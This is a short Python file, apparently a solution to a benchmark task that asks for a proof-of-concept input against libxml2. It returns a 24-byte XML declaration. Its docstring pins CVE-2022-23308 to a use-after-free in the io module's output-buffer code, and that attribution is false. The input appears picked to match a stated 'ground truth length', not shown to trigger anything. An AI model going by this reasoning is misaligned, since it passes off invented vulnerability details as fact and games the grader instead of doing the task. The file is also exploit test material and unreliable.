import sys
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (CVE-2022-23308) is a Heap Use-After-Free in libxml2's io module,
        specifically in xmlAllocOutputBuffer/xmlAllocOutputBufferInternal.
        It is triggered when an output buffer is created with an encoding handler, and ownership
        logic is mishandled (e.g., during serialization).
        
        The ground truth length is 24 bytes.
        '<?xml encoding="UTF-8"?>' is exactly 24 bytes and sets the document encoding to "UTF-8",
        which triggers the vulnerable code path during output buffer creation.
        """
        return b'<?xml encoding="UTF-8"?>'
